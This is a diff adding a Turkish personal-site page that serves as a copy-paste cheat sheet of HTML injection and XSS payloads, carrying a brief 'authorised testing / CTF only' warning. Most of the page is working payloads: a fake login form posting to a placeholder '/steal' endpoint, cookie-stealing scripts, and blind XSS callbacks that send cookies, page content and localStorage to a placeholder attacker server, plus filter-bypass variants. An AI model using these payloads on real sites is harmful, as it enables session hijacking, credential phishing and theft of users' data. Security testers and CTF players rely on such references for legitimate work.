@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>~/payloads — ikbal.exe</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Pacifico&family=Nunito:wght@700;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0d0008;
+    --pink: #ff6eb4;
+    --bright: #ff1f8e;
+    --dim: #6b1a3e;
+    --mid: #9b2060;
+    --card: #130010;
+    --border: #3a0025;
+    --green: #8affc1;
+    --yellow: #ffe07a;
+    --white: #ffe0f5;
+    --glow: rgba(255,110,180,0.35);
+  }
+
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body {
+    background: var(--bg);
+    color: var(--pink);
+    font-family: 'Share Tech Mono', monospace;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  body::before {
+    content:''; position:fixed; inset:0; pointer-events:none;
+    background: repeating-linear-gradient(0deg, transparent, transparent 2px,
+      rgba(255,110,180,0.015) 2px, rgba(255,110,180,0.015) 4px);
+    z-index: 0;
+  }
+
+  /* NAV */
+  nav {
+    position:fixed; top:0; left:0; right:0; z-index:1000;
+    background: rgba(13,0,8,0.97); backdrop-filter: blur(12px);
+    border-bottom: 1px solid var(--dim);
+    display:flex; align-items:center; justify-content:space-between;
+    padding: 0 2rem; height:56px;
+    box-shadow: 0 2px 20px rgba(255,30,140,0.15);
+  }
+  .nav-logo { color:var(--pink); font-size:1.05rem; text-shadow:0 0 10px var(--glow); letter-spacing:2px; }
+  .nav-logo span { color:var(--bright); }
+  .nav-links { display:flex; gap:0.3rem; list-style:none; flex-wrap:wrap; }
+  .nav-links a {
+    font-size:0.75rem; color:var(--dim); text-decoration:none;
+    padding:0.4rem 0.75rem; border:1px solid transparent; border-radius:4px;
+    transition:all 0.2s; letter-spacing:1px;
+  }
+  .nav-links a:hover, .nav-links a.active {
+    color:var(--pink); border-color:var(--dim);
+    text-shadow:0 0 8px var(--glow); background:rgba(255,110,180,0.06);
+  }
+  @media(max-width:700px){ .nav-links a { font-size:0.65rem; padding:0.3rem 0.5rem; } }
+
+  /* LAYOUT */
+  .wrap {
+    max-width: 960px; margin: 0 auto;
+    padding: 76px 1.5rem 3rem;
+    position: relative; z-index: 1;
+  }
+
+  /* HEADER */
+  .page-header { text-align:center; margin-bottom: 2.5rem; }
+  .page-title {
+    font-family:'Pacifico', cursive;
+    font-size: clamp(1.8rem, 5vw, 2.8rem);
+    color: var(--bright);
+    text-shadow: 0 0 20px var(--glow), 2px 3px 0 rgba(255,30,140,0.25);
+    margin-bottom: 0.5rem;
+  }
+  .page-sub {
+    color: var(--dim); font-size:0.82rem; letter-spacing:2px;
+  }
+  .warning-bar {
+    display:flex; align-items:center; gap:0.8rem;
+    background: rgba(255,180,0,0.06);
+    border: 1px solid rgba(255,200,0,0.2);
+    border-radius: 8px; padding: 0.7rem 1.2rem;
+    margin-bottom: 2rem;
+    font-size: 0.8rem; color: var(--yellow);
+  }
+
+  /* SECTION */
+  .section { margin-bottom: 2.5rem; }
+  .section-title {
+    display:flex; align-items:center; gap:0.8rem;
+    font-size:1rem; letter-spacing:3px; margin-bottom: 1rem;
+    padding-bottom: 0.5rem;
+    border-bottom: 1px solid var(--border);
+  }
+  .section-title .tag {
+    background: rgba(255,30,140,0.12);
+    border: 1px solid var(--mid);
+    border-radius: 4px; padding: 0.15rem 0.6rem;
+    font-size:0.72rem; color:var(--bright);
+  }
+  .section-desc {
+    color: var(--dim); font-size:0.8rem; margin-bottom: 1rem;
+    line-height:1.7;
+  }
+
+  /* PAYLOAD CARD */
+  .payload-grid {
+    display: flex; flex-direction: column; gap: 0.6rem;
+  }
+
+  .payload-card {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+    transition: border-color 0.2s;
+  }
+  .payload-card:hover { border-color: var(--mid); }
+
+  .payload-top {
+    display:flex; align-items:center; justify-content:space-between;
+    padding: 0.5rem 0.8rem 0.3rem;
+    gap: 0.5rem;
+  }
+  .payload-label {
+    font-size: 0.72rem; color: var(--mid); letter-spacing:1px;
+    white-space: nowrap;
+  }
+  .payload-badges { display:flex; gap:0.4rem; flex-shrink:0; }
+  .badge {
+    font-size:0.65rem; padding:0.1rem 0.5rem; border-radius:3px;
+    border: 1px solid; white-space:nowrap;
+  }
+  .badge.reflected  { color:#88ccff; border-color:#224466; background:rgba(40,100,180,0.1); }
+  .badge.stored     { color:#ffaa55; border-color:#664422; background:rgba(180,80,0,0.1); }
+  .badge.dom        { color:#aaffaa; border-color:#226622; background:rgba(0,120,0,0.1); }
+  .badge.blind      { color:#ff88cc; border-color:#662244; background:rgba(180,0,80,0.1); }
+  .badge.html       { color:#cc99ff; border-color:#442266; background:rgba(100,0,180,0.1); }
+  .badge.bypass     { color:#ffff88; border-color:#666622; background:rgba(120,120,0,0.1); }
+
+  .payload-body {
+    padding: 0.4rem 0.8rem 0.6rem;
+    display:flex; align-items:center; gap:0.8rem;
+  }
+  .payload-code {
+    flex:1; font-family:'Share Tech Mono',monospace;
+    font-size:clamp(0.72rem,1.8vw,0.88rem);
+    color: var(--white);
+    background: rgba(255,110,180,0.04);
+    border: 1px solid var(--border);
+    border-radius:5px; padding:0.55rem 0.8rem;
+    white-space: pre-wrap; word-break:break-all;
+    line-height:1.5;
+    cursor: text;
+    user-select: all;
+  }
+
+  .copy-btn {
+    flex-shrink:0;
+    background: transparent;
+    border: 1px solid var(--dim);
+    color: var(--dim);
+    padding: 0.45rem 0.85rem;
+    border-radius:5px;
+    font-family:'Share Tech Mono',monospace;
+    font-size:0.78rem;
+    cursor:pointer;
+    transition: all 0.2s;
+    white-space:nowrap;
+    letter-spacing:1px;
+  }
+  .copy-btn:hover { border-color:var(--pink); color:var(--pink); text-shadow:0 0 6px var(--glow); }
+  .copy-btn.copied { border-color:var(--green); color:var(--green); }
+
+  /* DIVIDER */
+  .divider {
+    border:none; border-top:1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  ::-webkit-scrollbar { width:6px; }
+  ::-webkit-scrollbar-track { background:var(--bg); }
+  ::-webkit-scrollbar-thumb { background:var(--dim); border-radius:6px; }
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="nav-logo">&gt; <span>ikbal</span>.exe</div>
+  <ul class="nav-links">
+    <li><a href="index.html">~/sevgi</a></li>
+    <li><a href="cmd.html">~/terminal</a></li>
+    <li><a href="cipher.html">~/sifrele</a></li>
+    <li><a href="zaman.html">~/zaman</a></li>
+    <li><a href="ukulele.html">~/ukulele</a></li>
+    <li><a href="payloads.html" class="active">~/payloads</a></li>
+  </ul>
+</nav>
+
+<div class="wrap">
+
+  <div class="page-header">
+    <h1 class="page-title">💉 Payloads</h1>
+    <p class="page-sub">// html_injection & xss_reference.txt — kopyala, yapıştır, test et</p>
+  </div>
+
+  <div class="warning-bar">
+    ⚠️ &nbsp;Sadece izinli olduğun sistemlerde test et. Bu payloadlar eğitim ve CTF amaçlıdır.
+  </div>
+
+  <!-- ══════════════════════════════════════
+       HTML INJECTION
+  ══════════════════════════════════════ -->
+  <div class="section">
+    <div class="section-title">
+      <span style="color:var(--bright)">01</span>
+      HTML Injection
+      <span class="tag">HTML</span>
+    </div>
+    <p class="section-desc">
+      Kullanıcı girdisi HTML olarak render edildiğinde çalışır.
+      Sayfa yapısını bozmak, sahte içerik enjekte etmek için kullanılır.
+    </p>
+    <div class="payload-grid" id="html-grid"></div>
+  </div>
+
+  <hr class="divider">
+
+  <!-- ══════════════════════════════════════
+       XSS
+  ══════════════════════════════════════ -->
+  <div class="section">
+    <div class="section-title">
+      <span style="color:var(--bright)">02</span>
+      Cross-Site Scripting (XSS)
+      <span class="tag">XSS</span>
+    </div>
+    <p class="section-desc">
+      JavaScript çalıştırmak için kullanılan payloadlar.
+      Reflected, Stored, DOM-based ve Blind kategorileri içerir.
+    </p>
+    <div class="payload-grid" id="xss-grid"></div>
+  </div>
+
+</div>
+
+<script>
+// ══════════════════════════════════════
+//  PAYLOAD DATA
+// ══════════════════════════════════════
+const HTML_PAYLOADS = [
+  {
+    label: 'Temel başlık enjeksiyonu',
+    badges: ['html'],
+    code: '<h1>Hacked</h1>',
+  },
+  {
+    label: 'Stil değiştirme',
+    badges: ['html'],
+    code: '<h1 style="color:red;font-size:50px">HACKED</h1>',
+  },
+  {
+    label: 'Sahte giriş formu',
+    badges: ['html', 'stored'],
+    code: '<form action="https://BURAYA_SUNUCU/steal" method="POST">\n  <input name="user" placeholder="Kullanıcı adı">\n  <input name="pass" type="password" placeholder="Şifre">\n  <button>Giriş Yap</button>\n</form>',
+  },
+  {
+    label: 'Sayfa yönlendirme (meta refresh)',
+    badges: ['html'],
+    code: '<meta http-equiv="refresh" content="5;url=https://BURAYA_SUNUCU">',
+  },
+  {
+    label: 'İframe enjeksiyonu',
+    badges: ['html'],
+    code: '<iframe src="https://BURAYA_SUNUCU" width="100%" height="100%" style="position:fixed;top:0;left:0;border:0;z-index:9999"></iframe>',
+  },
+  {
+    label: 'Link spoofing',
+    badges: ['html'],
+    code: '<a href="https://BURAYA_SUNUCU">Şifreni Sıfırla</a>',
+  },
+  {
+    label: 'Görsel enjeksiyonu',
+    badges: ['html'],
+    code: '<img src="https://BURAYA_SUNUCU/fake.jpg" alt="Sistem hatası - lütfen tekrar giriş yapın">',
+  },
+  {
+    label: 'Stil ile içerik gizleme',
+    badges: ['html'],
+    code: '<style>body{display:none}</style><h1 style="display:block">Sayfa bakımda</h1>',
+  },
+];
+
+const XSS_PAYLOADS = [
+  {
+    label: 'Klasik script tag',
+    badges: ['reflected'],
+    code: '<script>alert(1)<\/script>',
+  },
+  {
+    label: 'Script — cookie çalma',
+    badges: ['reflected', 'stored'],
+    code: '<script>document.location="https://BURAYA_SUNUCU/c?c="+document.cookie<\/script>',
+  },
+  {
+    label: 'img onerror — en popüler',
+    badges: ['reflected'],
+    code: '<img src=x onerror=alert(1)>',
+  },
+  {
+    label: 'img onerror — cookie exfil',
+    badges: ['reflected', 'stored'],
+    code: '<img src=x onerror="fetch(\'https://BURAYA_SUNUCU/?c=\'+document.cookie)">',
+  },
+  {
+    label: 'img — attribute escape + onerror',
+    badges: ['reflected', 'bypass'],
+    code: '"><img src=x onerror=alert(document.domain)>',
+  },
+  {
+    label: 'img — encoding bypass',
+    badges: ['bypass'],
+    code: '<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
+  },
+  {
+    label: 'SVG onload',
+    badges: ['reflected'],
+    code: '<svg onload=alert(1)>',
+  },
+  {
+    label: 'SVG — script içinde',
+    badges: ['reflected'],
+    code: '<svg><script>alert(1)<\/script><\/svg>',
+  },
+  {
+    label: 'SVG — animateTransform',
+    badges: ['bypass'],
+    code: '<svg><animateTransform onbegin=alert(1) attributeName=transform>',
+  },
+  {
+    label: 'SVG — foreignObject ile',
+    badges: ['bypass'],
+    code: '<svg><foreignObject><iframe onload=alert(1)><\/iframe><\/foreignObject><\/svg>',
+  },
+  {
+    label: 'Attribute çıkışı — event handler',
+    badges: ['reflected', 'bypass'],
+    code: '" onmouseover="alert(1)',
+  },
+  {
+    label: 'Attribute çıkışı — onfocus + autofocus',
+    badges: ['reflected'],
+    code: '" onfocus="alert(1)" autofocus="',
+  },
+  {
+    label: 'Tek tırnak + event handler',
+    badges: ['reflected', 'bypass'],
+    code: "' onmouseover='alert(1)",
+  },
+  {
+    label: 'Input tag — attribute injection',
+    badges: ['reflected'],
+    code: '"><input autofocus onfocus=alert(1)>',
+  },
+  {
+    label: 'Büyük/küçük harf bypass',
+    badges: ['bypass'],
+    code: '<ScRiPt>alert(1)<\/ScRiPt>',
+  },
+  {
+    label: 'Script keyword bypass — URL encode',
+    badges: ['bypass'],
+    code: '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
+  },
+  {
+    label: 'javascript: protokol (href)',
+    badges: ['reflected', 'dom'],
+    code: 'javascript:alert(document.cookie)',
+  },
+  {
+    label: 'data URI — base64',
+    badges: ['bypass'],
+    code: '<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
+  },
+  {
+    label: 'body onload bypass',
+    badges: ['bypass'],
+    code: '<\/title><\/head><body onload=alert(1)>',
+  },
+  {
+    label: 'DOM — location.hash ile',
+    badges: ['dom'],
+    code: '#"><img src=x onerror=alert(1)>',
+  },
+  {
+    label: 'DOM — innerHTML sink',
+    badges: ['dom'],
+    code: '<img src=1 onerror=alert(document.domain)>',
+  },
+  {
+    label: 'DOM — eval ile',
+    badges: ['dom'],
+    code: "';alert(document.cookie)//",
+  },
+  {
+    label: 'Blind XSS — XSS Hunter (klasik)',
+    badges: ['blind'],
+    code: '"><script src="https://SENIN_ID.xss.ht"><\/script>',
+  },
+  {
+    label: 'Blind XSS — fetch ile callback',
+    badges: ['blind'],
+    code: '<script>\n  fetch("https://BURAYA_SUNUCU/blind?"+btoa(JSON.stringify({\n    cookie: document.cookie,\n    url: location.href,\n    dom: document.documentElement.innerHTML.substring(0,500)\n  })))\n<\/script>',
+  },
+  {
+    label: 'Blind XSS — img onerror + data exfil',
+    badges: ['blind'],
+    code: '<img src=x onerror="new Image().src=\'https://BURAYA_SUNUCU/?d=\'+btoa(document.cookie)">',
+  },
+  {
+    label: 'Blind XSS — localStorage dump',
+    badges: ['blind'],
+    code: '<script>\n  var d={};\n  for(var i=0;i<localStorage.length;i++){\n    d[localStorage.key(i)]=localStorage.getItem(localStorage.key(i));\n  }\n  fetch("https://BURAYA_SUNUCU/ls?d="+btoa(JSON.stringify(d)));\n<\/script>',
+  },
+];
+
+// ══════════════════════════════════════
+//  RENDER — tamamen güvenli, innerHTML yok
+// ══════════════════════════════════════
+function renderPayloads(payloads, containerId) {
+  const container = document.getElementById(containerId);
+
+  payloads.forEach((p, idx) => {
+
+    // card wrapper
+    const card = document.createElement('div');
+    card.className = 'payload-card';
+
+    // ── top row ──
+    const top = document.createElement('div');
+    top.className = 'payload-top';
+
+    const lbl = document.createElement('span');
+    lbl.className = 'payload-label';
+    lbl.textContent = String(idx+1).padStart(2,'0') + ' // ' + p.label; // textContent = safe
+    top.appendChild(lbl);
+
+    const badges = document.createElement('div');
+    badges.className = 'payload-badges';
+    p.badges.forEach(b => {
+      const span = document.createElement('span');
+      span.className = 'badge ' + b;
+      span.textContent = b; // textContent = safe
+      badges.appendChild(span);
+    });
+    top.appendChild(badges);
+    card.appendChild(top);
+
+    // ── body row ──
+    const body = document.createElement('div');
+    body.className = 'payload-body';
+
+    const code = document.createElement('div');
+    code.className = 'payload-code';
+    code.textContent = p.code; // textContent = ASLA çalıştırmaz, hep düz metin gösterir
+
+    const btn = document.createElement('button');
+    btn.className = 'copy-btn';
+    btn.textContent = '📋 kopyala';
+    btn.addEventListener('click', () => copyPayload(btn, p.code));
+
+    body.appendChild(code);
+    body.appendChild(btn);
+    card.appendChild(body);
+
+    container.appendChild(card);
+  });
+}
+
+function copyPayload(btn, rawCode) {
+  navigator.clipboard.writeText(rawCode).catch(() => {
+    const ta = document.createElement('textarea');
+    ta.value = rawCode;
+    ta.style.cssText = 'position:fixed;opacity:0;pointer-events:none';
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+  });
+  btn.textContent = '✓ kopyalandı';
+  btn.classList.add('copied');
+  setTimeout(() => {
+    btn.textContent = '📋 kopyala';
+    btn.classList.remove('copied');
+  }, 1500);
+}
+
+renderPayloads(HTML_PAYLOADS, 'html-grid');
+renderPayloads(XSS_PAYLOADS, 'xss-grid');
+</script>
+</body>
+</html>
